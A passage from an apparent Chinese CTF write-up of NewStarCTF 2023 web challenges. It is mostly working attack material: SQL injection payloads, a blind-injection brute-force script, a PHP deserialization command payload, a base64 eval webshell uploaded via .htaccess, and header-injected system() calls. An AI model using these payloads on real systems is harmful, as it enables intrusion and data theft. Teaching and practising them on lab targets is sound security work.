</span></span><span class=line><span class=cl>ISO-8859-16*
</span></span><span class=line><span class=cl>byte2be
</span></span><span class=line><span class=cl>byte2le
</span></span><span class=line><span class=cl>byte4be
</span></span><span class=line><span class=cl>byte4le
</span></span><span class=line><span class=cl>BASE64
</span></span><span class=line><span class=cl>HTML-ENTITIES (alias: HTML)
</span></span><span class=line><span class=cl>7bit
</span></span><span class=line><span class=cl>8bit
</span></span><span class=line><span class=cl>EUC-CN*
</span></span><span class=line><span class=cl>CP936
</span></span><span class=line><span class=cl>GB18030
</span></span><span class=line><span class=cl>HZ
</span></span><span class=line><span class=cl>EUC-TW*
</span></span><span class=line><span class=cl>CP950
</span></span><span class=line><span class=cl>BIG-5*
</span></span><span class=line><span class=cl>EUC-KR*
</span></span><span class=line><span class=cl>UHC (alias: CP949)
</span></span><span class=line><span class=cl>ISO-2022-KR
</span></span><span class=line><span class=cl>Windows-1251 (alias: CP1251)
</span></span><span class=line><span class=cl>Windows-1252 (alias: CP1252)
</span></span><span class=line><span class=cl>CP866 (alias: IBM866)
</span></span><span class=line><span class=cl>KOI8-R*
</span></span><span class=line><span class=cl>KOI8-U*
</span></span><span class=line><span class=cl>ArmSCII-8 (alias: ArmSCII8)
</span></span></code></pre></td></tr></table></div></div><p>门道很深，可以看看陆队的文章</p><p><a class=link href=https://zedd-yu-github-io.vercel.app/p/hxp-ctf-2021-the-end-of-lfi/ target=_blank rel=noopener>https://zedd-yu-github-io.vercel.app/p/hxp-ctf-2021-the-end-of-lfi/</a></p><h2 id=ez_sql>ez_sql</h2><p>简单过滤联合注入即可</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=s1>&#39;union sElect 1,2,3,4,5--+
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>&#39;</span><span class=k>union</span><span class=w> </span><span class=k>sElect</span><span class=w> </span><span class=mi>1</span><span class=p>,</span><span class=mi>2</span><span class=p>,</span><span class=mi>3</span><span class=p>,(</span><span class=k>sElect</span><span class=w> </span><span class=n>group_concat</span><span class=p>(</span><span class=k>table_name</span><span class=p>)</span><span class=k>from</span><span class=w> </span><span class=n>mysql</span><span class=p>.</span><span class=n>innodb_table_stats</span><span class=p>),</span><span class=mi>5</span><span class=c1>--+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>#</span><span class=w> </span><span class=n>grades</span><span class=p>,</span><span class=n>here_is_flag</span><span class=p>,</span><span class=n>gtid_slave_pos</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=s1>&#39;union sElect 1,2,3,(sElect group_concat(`1`) from (sElect * from here_is_flag)a),5--+
</span></span></span><span class=line><span class=cl><span class=s1># 没报错说明没写错，再把flag带出来就行
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>&#39;</span><span class=k>union</span><span class=w> </span><span class=k>sElect</span><span class=w> </span><span class=mi>1</span><span class=p>,</span><span class=mi>2</span><span class=p>,</span><span class=mi>3</span><span class=p>,(</span><span class=k>sElect</span><span class=w> </span><span class=n>group_concat</span><span class=p>(</span><span class=o>`</span><span class=mi>3</span><span class=o>`</span><span class=p>)</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=p>(</span><span class=k>Select</span><span class=w> </span><span class=mi>3</span><span class=w> </span><span class=k>union</span><span class=w> </span><span class=k>sElect</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>here_is_flag</span><span class=p>)</span><span class=n>a</span><span class=p>),</span><span class=mi>5</span><span class=c1>--+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>#</span><span class=w> </span><span class=mi>1</span><span class=p>,</span><span class=n>flag</span><span class=err>{</span><span class=n>bc8317fc</span><span class=o>-</span><span class=n>c0b2</span><span class=o>-</span><span class=mi>489</span><span class=n>e</span><span class=o>-</span><span class=mi>879</span><span class=n>d</span><span class=o>-</span><span class=mi>111</span><span class=n>a988aa848</span><span class=err>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><h2 id=unserialize>Unserialize？</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nx>highlight_file</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=c1>// Maybe you need learn some knowledge about deserialize?
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>class</span> <span class=nc>evil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=nv>$cmd</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__destruct</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=nx>preg_match</span><span class=p>(</span><span class=s2>&#34;/cat|tac|more|tail|base/i&#34;</span><span class=p>,</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>cmd</span><span class=p>)){</span>
</span></span><span class=line><span class=cl>            <span class=o>@</span><span class=nx>system</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>cmd</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>@</span><span class=nx>unserialize</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;unser&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>evil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=nv>$cmd</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>function</span> <span class=fm>__construct</span><span class=p>(</span><span class=nv>$cmd1</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>cmd</span><span class=o>=</span><span class=nv>$cmd1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>//$a=new evil(&#39;ls /&#39;);
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nv>$a</span><span class=o>=</span><span class=k>new</span> <span class=nx>evil</span><span class=p>(</span><span class=s1>&#39;head /th1s_1s_fffflllll4444aaaggggg &#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>urlencode</span><span class=p>(</span><span class=nx>serialize</span><span class=p>(</span><span class=nv>$a</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><h2 id=upload-again>Upload again!</h2><p>上传<code>.htaccess</code>就好了</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>f1d94384-8066-4dac-a014-e34ab19ed6fc.node5.buuoj.cn:81</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36</span>
</span></span><span class=line><span class=cl><span class=n>Origin</span><span class=o>:</span> <span class=l>http://f1d94384-8066-4dac-a014-e34ab19ed6fc.node5.buuoj.cn:81</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>multipart/form-data; boundary=----WebKitFormBoundarypelbI2sZUZHuXDs8</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate</span>
</span></span><span class=line><span class=cl><span class=n>Upgrade-Insecure-Requests</span><span class=o>:</span> <span class=l>1</span>
</span></span><span class=line><span class=cl><span class=n>Cache-Control</span><span class=o>:</span> <span class=l>max-age=0</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span>
</span></span><span class=line><span class=cl><span class=n>Referer</span><span class=o>:</span> <span class=l>http://f1d94384-8066-4dac-a014-e34ab19ed6fc.node5.buuoj.cn:81/</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7</span>
</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>315</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>------WebKitFormBoundarypelbI2sZUZHuXDs8
</span></span><span class=line><span class=cl>Content-Disposition: form-data; name=&#34;file&#34;; filename=&#34;poc.jpg&#34;
</span></span><span class=line><span class=cl>Content-Type: image/jpeg
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>PD9waHAgZXZhbCgkX1BPU1RbMV0pOw==
</span></span><span class=line><span class=cl>------WebKitFormBoundarypelbI2sZUZHuXDs8
</span></span><span class=line><span class=cl>Content-Disposition: form-data; name=&#34;submit&#34;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Upload!!!
</span></span><span class=line><span class=cl>------WebKitFormBoundarypelbI2sZUZHuXDs8--
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>#define width 1337
</span></span><span class=line><span class=cl>#define height 1337
</span></span><span class=line><span class=cl>php_value auto_prepend_file &#34;php://filter/convert.base64-decode/resource=./poc.jpg&#34;
</span></span><span class=line><span class=cl>AddType application/x-httpd-php .jpg
</span></span></code></pre></td></tr></table></div></div><h2 id=rce-1>R!!C!!E!!</h2><p>git恢复之后拿到源码</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nx>highlight_file</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=s1>&#39;;&#39;</span> <span class=o>===</span> <span class=nx>preg_replace</span><span class=p>(</span><span class=s1>&#39;/[^\W]+\((?R)?\)/&#39;</span><span class=p>,</span> <span class=s1>&#39;&#39;</span><span class=p>,</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;star&#39;</span><span class=p>]))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/high|get_defined_vars|scandir|var_dump|read|file|php|curent|end/i&#39;</span><span class=p>,</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;star&#39;</span><span class=p>])){</span>
</span></span><span class=line><span class=cl>        <span class=k>eval</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;star&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>本地测试可以RCE，</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>GET</span> <span class=nn>/1.php?star=eval(next(getallheaders()));</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>127.0.0.1</span>
</span></span><span class=line><span class=cl><span class=n>Pragma</span><span class=o>:</span> <span class=l>no-cache</span>
</span></span><span class=line><span class=cl><span class=n>sec-fetch-user</span><span class=o>:</span> <span class=l>?1</span>
</span></span><span class=line><span class=cl><span class=n>Upgrade-Insecure-Requests</span><span class=o>:</span> <span class=l>1</span>
</span></span><span class=line><span class=cl><span class=n>Sec-Fetch-Dest</span><span class=o>:</span> <span class=l>document</span>
</span></span><span class=line><span class=cl><span class=n>Cookie</span><span class=o>:</span> <span class=l>csrftoken=ios9iHNebuk0W5D7bdZg9D3jNzVny0Em</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate, br, zstd</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7</span>
</span></span><span class=line><span class=cl><span class=n>sec-ch-ua-platform</span><span class=o>:</span> <span class=l>&#34;Windows&#34;</span>
</span></span><span class=line><span class=cl><span class=n>sec-ch-ua</span><span class=o>:</span> <span class=l>&#34;Not)A;Brand&#34;;v=&#34;8&#34;, &#34;Chromium&#34;;v=&#34;138&#34;, &#34;Google Chrome&#34;;v=&#34;138&#34;</span>
</span></span><span class=line><span class=cl><span class=n>Sec-Fetch-Mode</span><span class=o>:</span> <span class=l>navigate</span>
</span></span><span class=line><span class=cl><span class=n>sec-ch-ua-mobile</span><span class=o>:</span> <span class=l>?0</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>system(&#34;whoami&#34;);</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span>
</span></span></code></pre></td></tr></table></div></div><p>但是远程就很奇怪了，多了很多本身抓包都没有的http头</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>GET</span> <span class=nn>/bo0g1pop.php?star=eval(next(getallheaders()));</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>6e7da965-f969-4ad3-81bd-4be5caba6585.node5.buuoj.cn:81</span>
</span></span><span class=line><span class=cl><span class=n>X-Request-ID</span><span class=o>:</span> <span class=l>system(&#34;tac /f*&#34;);</span>
</span></span><span class=line><span class=cl><span class=n>Pragma</span><span class=o>:</span> <span class=l>no-cache</span>
</span></span><span class=line><span class=cl><span class=n>sec-fetch-user</span><span class=o>:</span> <span class=l>?1</span>
</span></span><span class=line><span class=cl><span class=n>Upgrade-Insecure-Requests</span><span class=o>:</span> <span class=l>1</span>
</span></span><span class=line><span class=cl><span class=n>Sec-Fetch-Dest</span><span class=o>:</span> <span class=l>document</span>
</span></span><span class=line><span class=cl><span class=n>Cookie</span><span class=o>:</span> <span class=l>csrftoken=ios9iHNebuk0W5D7bdZg9D3jNzVny0Em</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate, br, zstd</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7</span>
</span></span><span class=line><span class=cl><span class=n>sec-ch-ua-platform</span><span class=o>:</span> <span class=l>&#34;Windows&#34;</span>
</span></span><span class=line><span class=cl><span class=n>sec-ch-ua</span><span class=o>:</span> <span class=l>&#34;Not)A;Brand&#34;;v=&#34;8&#34;, &#34;Chromium&#34;;v=&#34;138&#34;, &#34;Google Chrome&#34;;v=&#34;138&#34;</span>
</span></span><span class=line><span class=cl><span class=n>Sec-Fetch-Mode</span><span class=o>:</span> <span class=l>navigate</span>
</span></span><span class=line><span class=cl><span class=n>sec-ch-ua-mobile</span><span class=o>:</span> <span class=l>?0</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>system(&#34;whoami&#34;);</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span>
</span></span></code></pre></td></tr></table></div></div><p>但是这些请求头又都是可控的，所以赋值就可以R</p><h2 id=medium_sql>medium_sql</h2><p>这道题有点离谱的是<code>information</code>必须写成<code>infOrmation</code>不然就不成功。很奇怪</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>tqdm</span> <span class=kn>import</span> <span class=n>tqdm</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=s2>&#34;http://f91b90bf-0fac-4211-8ae0-f1c9ca753a60.node5.buuoj.cn:81/?id=&#34;</span>
</span></span><span class=line><span class=cl><span class=n>maxlen</span> <span class=o>=</span> <span class=mi>50</span>
</span></span><span class=line><span class=cl><span class=n>target</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=n>maxlen</span><span class=o>+</span><span class=mi>1</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>found</span> <span class=o>=</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>mid</span> <span class=ow>in</span> <span class=n>tqdm</span><span class=p>(</span><span class=nb>range</span><span class=p>(</span><span class=mi>32</span><span class=p>,</span> <span class=mi>127</span><span class=p>),</span> <span class=n>desc</span><span class=o>=</span><span class=sa>f</span><span class=s2>&#34;爆破第</span><span class=si>{</span><span class=n>i</span><span class=si>}</span><span class=s2>位&#34;</span><span class=p>,</span> <span class=n>ncols</span><span class=o>=</span><span class=mi>70</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=c1># payload = f&#34;TMP0929&#39;AnD If(Ascii(Mid((database()),{i},1))={mid},1,0)--+&#34;</span>
</span></span><span class=line><span class=cl>        <span class=c1># ctf</span>
</span></span><span class=line><span class=cl>        <span class=c1># payload = f&#34;TMP0929&#39;AnD If(Ascii(Mid((Select(Group_concat(table_name))From(infOrmation_schema.tables)wHere(Table_schema=&#39;ctf&#39;)),{i},1))={mid},1,0)--+&#34;</span>
</span></span><span class=line><span class=cl>        <span class=c1># here_is_flag,grades</span>
</span></span><span class=line><span class=cl>        <span class=c1># payload = f&#34;TMP0929&#39;AnD If(Ascii(Mid((Select(Group_concat(column_name))From(infOrmation_schema.columns)wHere(Table_name=&#39;here_is_flag&#39;)),{i},1))={mid},1,0)--+&#34;</span>
</span></span><span class=line><span class=cl>        <span class=c1># flag</span>
</span></span><span class=line><span class=cl>        <span class=n>payload</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;TMP0929&#39;AnD If(Ascii(Mid((Select(flag)From(ctf.here_is_flag)),</span><span class=si>{</span><span class=n>i</span><span class=si>}</span><span class=s2>,1))=</span><span class=si>{</span><span class=n>mid</span><span class=si>}</span><span class=s2>,1,0)--+&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url</span> <span class=o>+</span> <span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=s2>&#34;TMP0929&#34;</span> <span class=ow>in</span> <span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>target</span> <span class=o>+=</span> <span class=nb>chr</span><span class=p>(</span><span class=n>mid</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>tqdm</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>i</span><span class=si>}</span><span class=s2>位: </span><span class=si>{</span><span class=nb>chr</span><span class=p>(</span><span class=n>mid</span><span class=p>)</span><span class=si>}</span><span class=s2> 当前: </span><span class=si>{</span><span class=n>target</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>found</span> <span class=o>=</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=n>found</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s2>&#34;结果:&#34;</span><span class=p>,</span> <span class=n>target</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=pop-gadget>POP Gadget</h2><p>他这php版本其实是修饰符不敏感的</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nx>highlight_file</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Begin</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$name</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__destruct</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s2>&#34;/[a-zA-Z0-9]/&#34;</span><span class=p>,</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>name</span><span class=p>)){</span>
</span></span><span class=line><span class=cl>            <span class=k>echo</span> <span class=s2>&#34;Hello&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span><span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>echo</span> <span class=s2>&#34;Welcome to NewStarCTF 2023!&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
